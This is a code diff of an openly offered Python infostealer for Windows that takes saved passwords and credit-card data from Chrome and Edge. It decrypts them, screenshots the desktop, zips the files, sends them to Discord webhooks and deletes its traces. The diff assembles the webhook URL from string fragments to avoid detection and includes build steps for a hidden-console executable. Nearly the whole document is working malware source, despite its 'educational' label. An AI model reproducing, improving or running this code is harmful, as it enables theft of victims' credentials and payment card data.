@@ -1,65 +1,79 @@
-#==========#=============================================================#
-#  SOCIAL  # author: social/s4cial on github							 #
-#==========# browser passwords steal, sends data to a discord webhook;   #
-# PYTHON 2 # poorly made / not my best                                   #
-#==========#=============================================================#
-# PY > EXE #															 #
-#==========##==========##==========##==========##==========##============#
-# pip install pyinstaller												 #
-# cd path/to/files/												         #
-# pyinstaller --clean --onefile --noconsole --i icon.ico browsersteal.py #
-#==========##==========##==========##==========##==========##============#
-import os
-if os.name != "nt":
-    exit()
-import sys
-import shutil
-import sqlite3
-import pywintypes
-import win32gui
-import json
-import base64
+#[=========================================]#[=========================================]#
+# chromium-based password/cc stealer > educational purposed                             #
+# "awkward" undetectable webhook method > or so i hope it's "undetectable"              #
+# utilizes discord's webhook capability to send victim's passwords in a .zip file       #
+# authored by s4cial | github: s4cial                                                   #
+# poorly made/not my best > cleaned up a little                                         #
+#[=========================================]#[=========================================]#
+# py > exe :                                                                            #
+# pip install pyinstaller												                # 
+# cd path/to/files/												                        #
+# pyinstaller --clean --onefile --noconsole --i icon.ico browsersteal.py                #
+#[=========================================]#[=========================================]#
+# would love to see a better version of this, when making this > there previously 0 repo's with this concept
+# decided to put the idea out there, hopefully someone alot more advanced than i can create something a little more functional
+#[=========================================]#[=========================================]#
+
+# DEPENDENCIES
+import http.cookiejar as cookiejar
+import ctypes.wintypes
+import cryptography
 import requests
 import platform
+import sqlite3
 import zipfile
-import smtplib
-import http.cookiejar as cookiejar
-from urllib.parse import urlencode
+import base64
+import shutil
 import ctypes
-import ctypes.wintypes
-import win32con
-import win32api
-import cryptography
-from shutil import copyfile
-from email import encoders
-from re import findall
-from json import loads, dumps
-from base64 import b64decode
-from subprocess import Popen, PIPE
-from urllib.request import Request, urlopen
-from datetime import datetime
-from threading import Thread
-from time import sleep
-from sys import argv
-from PIL import ImageGrab
-from dhooks import Webhook, File
-from Crypto.Cipher import AES
-from cryptography.hazmat.backends import default_backend
+import json
+import os
+import sys
+
+# DEPENDENCIES
 from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from cryptography.hazmat.backends import default_backend
+from urllib.request import Request, urlopen
+from subprocess import Popen, PIPE
+from urllib.parse import urlencode
+from dhooks import Webhook, File
+from Crypto.Cipher import AES
+from json import loads, dumps
+from datetime import datetime
+from threading import Thread
+from base64 import b64decode
+from shutil import copyfile
+from email import encoders
+from PIL import ImageGrab
+from re import findall
+from time import sleep
+from sys import argv
 
-#DISCORD WEBHOOK:
-hook = Webhook(
-    "webhook")
-#DISCORD WEBHOOK 2:
-hooks = Webhook(
-    "webhook")
+# EXAMPLE   : >                                      V "ID"     V "TOKEN"
+# IMPORTANT : > REPLACE "ID" & "AUTH" | EX: webhooks/1233456789/hiddentoken
+ht = "https:" 
+slash = "/"
+discord = "discord"
+period = "."
+id = "____"  # DISCORD WEBHOOK ID : > REPLACE THIS
+auth = "___" # DISCORD WEBHOOK TOKEN : > REPLACE THIS
+web = "web"
+hoo = "hooks"
 
+# DISCORD WEBHOOK 1 : > REPLACE WITH YOUR WEBHOOK ABOVE
+hook = Webhook(f"{ht}{slash}{slash}{discord}{period}com{slash}api{slash}{web}{hoo}{slash}{id}{slash}{auth}")
+
+# DISCORD WEBHOOK 2 : > REPLACE WITH YOUR WEBHOOK ABOVE
+hooks = Webhook(f"{ht}{slash}{slash}{discord}{period}com{slash}api{slash}{web}{hoo}{slash}{id}{slash}{auth}")
+
+# VARIABLES :
 APP_DATA_PATH = os.environ['LOCALAPPDATA']
 DB_PATH = r'Google\Chrome\User Data\Default\Login Data'
-
 NONCE_BYTE_SIZE = 12
 
+# MAIN
+def exit():
+    sys.exit(0)
 
 def encrypt(cipher, plaintext, nonce):
     cipher.mode = modes.GCM(nonce)
@@ -67,12 +81,10 @@ def encrypt(cipher, plaintext, nonce):
     ciphertext = encryptor.update(plaintext)
     return (cipher, ciphertext, nonce)
 
-
 def decrypt(cipher, ciphertext, nonce):
     cipher.mode = modes.GCM(nonce)
     decryptor = cipher.decryptor()
     return decryptor.update(ciphertext)
-
 
 def get_cipher(key):
     cipher = Cipher(
@@ -81,7 +93,6 @@ def get_cipher(key):
         backend=default_backend()
     )
     return cipher
-
 
 def decryptionDPAPI(encrypted):
     import ctypes
@@ -102,32 +113,11 @@ def decryptionDPAPI(encrypted):
     ctypes.windll.kernel32.LocalFree(blobout.pbData)
     return result
 
-
-def unix_decrypt(encrypted):
-    if sys.platform.startswith('linux'):
-        password = 'peanuts'
-        iterations = 1
-    else:
-        raise NotImplementedError
-
-    from Crypto.Cipher import AES
-    from Crypto.Protocol.KDF import PBKDF2
-
-    salt = 'saltysalt'
-    iv = ' ' * 16
-    length = 16
-    key = PBKDF2(password, salt, length, iterations)
-    cipher = AES.new(key, AES.MODE_CBC, IV=iv)
-    decrypted = cipher.decrypt(encrypted[3:])
-    return decrypted[:-ord(decrypted[-1])]
-
-
 def localdata_key():
     jsn = None
     with open(os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State"), encoding='utf-8', mode="r") as f:
         jsn = json.loads(str(f.readline()))
     return jsn["os_crypt"]["encrypted_key"]
-
 
 def aes_decrypt(encrypted_txt):
     encoded_key = localdata_key()
@@ -138,7 +128,7 @@ def aes_decrypt(encrypted_txt):
     cipher = get_cipher(key)
     return decrypt(cipher, encrypted_txt[15:], nonce)
 
-
+# CHROME PASSWORD-STEAL :
 class ChromePassword:
     def __init__(self):
         self.passwordList = []
@@ -178,76 +168,40 @@ class ChromePassword:
             except WindowsError:
                 return None
         else:
-            try:
-                return unix_decrypt(encrypted_txt)
-            except NotImplementedError:
-                return None
+            pass
 
     def save_passwords(self):
         with open('C:\\ProgramData\\Passwords.txt', 'w', encoding='utf-8') as f:
             f.writelines(self.passwordList)
-
 
 if __name__ == "__main__":
     Main = ChromePassword()
     Main.get_chrome_db()
     Main.save_passwords()
 
-if os.path.exists('C:\\Program Files\\Windows Defender'):
-    av = 'Windows Defender'
-if os.path.exists('C:\\Program Files\\AVAST Software\\Avast'):
-    av = 'Avast'
-if os.path.exists('C:\\Program Files\\AVG\\Antivirus'):
-    av = 'AVG'
-if os.path.exists('C:\\Program Files\\Avira\\Launcher'):
-    av = 'Avira'
-if os.path.exists('C:\\Program Files\\IObit\\Advanced SystemCare'):
-    av = 'Advanced SystemCare'
-if os.path.exists('C:\\Program Files\\Bitdefender Antivirus Free'):
-    av = 'Bitdefender'
-if os.path.exists('C:\\Program Files\\COMODO\\COMODO Internet Security'):
-    av = 'Comodo'
-if os.path.exists('C:\\Program Files\\DrWeb'):
-    av = 'Dr.Web'
-if os.path.exists('C:\\Program Files\\ESET\\ESET Security'):
-    av = 'ESET'
-if os.path.exists('C:\\Program Files\\GRIZZLY Antivirus'):
-    av = 'Grizzly Pro'
-if os.path.exists('C:\\Program Files\\Kaspersky Lab'):
-    av = 'Kaspersky'
-if os.path.exists('C:\\Program Files\\IObit\\IObit Malware Fighter'):
-    av = 'Malware fighter'
-if os.path.exists('C:\\Program Files\\360\\Total Security'):
-    av = '360 Total Security'
-else:
-    pass
-
-# SCREENSHOT:
+# DESKTOP SCREENSHOT :
 screen = ImageGrab.grab()
-screen.save(os.getenv('ProgramData') + '\\Screenshot.jpg')
-screen = open('C:\\ProgramData\\Screenshot.jpg', 'rb')
+screen.save(os.getenv('ProgramData') + r'\Screenshot.jpg')
+screen = open(r'C:\ProgramData\Screenshot.jpg', 'rb')
 screen.close()
-screenshot = File('C:\\ProgramData\\Screenshot.jpg')
+screenshot = File(r'C:\ProgramData\Screenshot.jpg')
 
-# PASSWORDS:
-zname = r'C:\\ProgramData\\Passwords.zip'
+# DEFINE PASSWORDS > SEND TO A .ZIP :
+zname = r'C:\ProgramData\Passwords.zip'
 newzip = zipfile.ZipFile(zname, 'w')
-newzip.write(r'C:\\ProgramData\\Passwords.txt')
-newzip.write(r'C:\\ProgramData\\Screenshot.jpg')
+newzip.write(r'C:\ProgramData\Passwords.txt')
+newzip.write(r'C:\ProgramData\Screenshot.jpg')
 newzip.close()
-passwords = File('C:\\ProgramData\\Passwords.zip')
+passwords = File(r'C:\ProgramData\Passwords.zip')
 
+# SEND OUR FILES TO OUR WEBHOOK > REMOVE THEM AFTER :
+hook.send("desktop :", file=screenshot)
+hook.send("passwords :", file=passwords)
+os.remove(r'C:\ProgramData\Passwords.txt')
+os.remove(r'C:\ProgramData\Screenshot.jpg')
+os.remove(r'C:\ProgramData\Passwords.zip')
 
-# SEND THOSE VARIABLES:
-hook.send("screenshot:", file=screenshot)
-hook.send("passwords:", file=passwords)
-os.remove('C:\\ProgramData\\Passwords.txt')
-os.remove('C:\\ProgramData\\Screenshot.jpg')
-os.remove('C:\\ProgramData\\Passwords.zip')
-
-# CHROME GRAB: (2) | SENDS CREDIT CARD INFORMATION
-
-
+# CHROME CREDIT-STEAL :
 def get_master_key():
     try:
         with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State',
@@ -255,22 +209,18 @@ def get_master_key():
             local_state = f.read()
             local_state = json.loads(local_state)
     except:
-        hook.send("chrome not installed, error.")
-        exit()
+        hook.send("chrome not installed > moving to next stage")
     master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
     master_key = master_key[5:]
     master_key = ctypes.windll.crypt32.CryptUnprotectData(
         (master_key, None, None, None, 0)[1])
     return master_key
 
-
 def decrypt_payload(cipher, payload):
     return cipher.decrypt(payload)
 
-
 def generate_cipher(aes_key, iv):
     return AES.new(aes_key, AES.MODE_GCM, iv)
-
 
 def decrypt_password(buff, master_key):
     try:
@@ -280,20 +230,18 @@ def decrypt_password(buff, master_key):
         decrypted_pass = decrypt_payload(cipher, payload)
         decrypted_pass = decrypted_pass[:-16].decode()
         return decrypted_pass
-    except Exception as e:
-        hook.send("password decryption: error, chrome < 80.")
+    except:
+        hook.send("decryption: error, chrome < 80")
         pass
-
 
 def get_password():
     master_key = get_master_key()
     login_db = os.environ['USERPROFILE'] + os.sep + \
         r'AppData\Local\Google\Chrome\User Data\default\Login Data'
     try:
-        shutil.copy2(login_db,
-                     "Loginvault.db")
+        shutil.copy2(login_db,"Loginvault.db")
     except:
-        hook.send("error, chrome isn't installed.")
+        hook.send("chrome not installed > moving to the next stage")
     conn = sqlite3.connect("Loginvault.db")
     cursor = conn.cursor()
 
@@ -307,18 +255,17 @@ def get_password():
             decrypted_password = decrypt_password(
                 encrypted_password, master_key)
             if username != "" or decrypted_password != "":
-                hook.send(f"URL: " + url + "\nUSER: " + username +
-                          "\nPASSWORD: " + decrypted_password + "\n" + "*" * 10 + "\n")
-    except Exception as e:
+                hook.send(f"URL: " + url + "\nUSER: " + username + "\nPASSWORD: " + decrypted_password + "\n" + "*" * 10 + "\n")
+    except:
+        os.remove("Loginvault.db")
         pass
 
     cursor.close()
     conn.close()
     try:
         os.remove("Loginvault.db")
-    except Exception as e:
+    except:
         pass
-
 
 def get_credit_cards():
     master_key = get_master_key()
@@ -341,19 +288,17 @@ def get_credit_cards():
             hook.send(f"CARD-NAME: " + username + "\nNUMBER: " + decrypted_password + "\nEXPIRY M: " +
                       str(expire_mon) + "\nEXPIRY Y: " + str(expire_year) + "\n" + "*" * 10 + "\n")
 
-    except Exception as e:
+    except:
         pass
 
     cursor.close()
     conn.close()
     try:
         os.remove("CCvault.db")
-    except Exception as e:
+    except:
         pass
 
-
-# MICROSOFT EDGE GRAB | SENDS CREDIT CARD INFORMATION & PASSWORDS
-
+# M.E CREDT/PASSWORD-STEAL :
 def get_password1():
     master_key = get_master_key()
     login_db = os.environ['USERPROFILE'] + os.sep + \
@@ -362,7 +307,7 @@ def get_password1():
         shutil.copy2(login_db,
                      "Loginvault.db")
     except:
-        hook.send("error, M.E isn't installed.")
+        hook.send("decryption: m.e data not found")
     conn = sqlite3.connect("Loginvault.db")
     cursor = conn.cursor()
 
@@ -378,16 +323,15 @@ def get_password1():
             if username != "" or decrypted_password != "":
                 hooks.send(f"URL: " + url + "\nUSER: " + username +
                            "\nPASSWORD: " + decrypted_password + "\n" + "*" * 10 + "\n")
-    except Exception as e:
+    except:
         pass
 
     cursor.close()
     conn.close()
     try:
         os.remove("Loginvault.db")
-    except Exception as e:
+    except:
         pass
-
 
 def get_credit_cards1():
     master_key = get_master_key()
@@ -396,7 +340,6 @@ def get_credit_cards1():
     try:
         shutil.copy2(login_db, "CCvault.db")
     except:
-        hook.send("error, M.E isn't installed.")
         conn = sqlite3.connect("Loginvault.db")
         cursor = conn.cursor()
         conn = sqlite3.connect("CCvault.db")
@@ -413,15 +356,14 @@ def get_credit_cards1():
             expire_year = r[3]
             hooks.send(f"CARD-NAME: " + username + "\nNUMBER: " + decrypted_password + "\nEXPIRY M: " +
                        str(expire_mon) + "\nEXPIRY Y: " + str(expire_year) + "\n" + "*" * 10 + "\n")
-
-    except Exception as e:
+    except:
         pass
 
     cursor.close()
     conn.close()
     try:
         os.remove("CCvault.db")
-    except Exception as e:
+    except:
         pass
 
 
@@ -430,5 +372,6 @@ while True:
     get_password1()
     get_credit_cards()
     get_credit_cards1()
-    os.remove("Loginvault.db") 
+    os.remove(r"\CCvault.db")
+    os.remove(r"\Loginvault.db")
     break
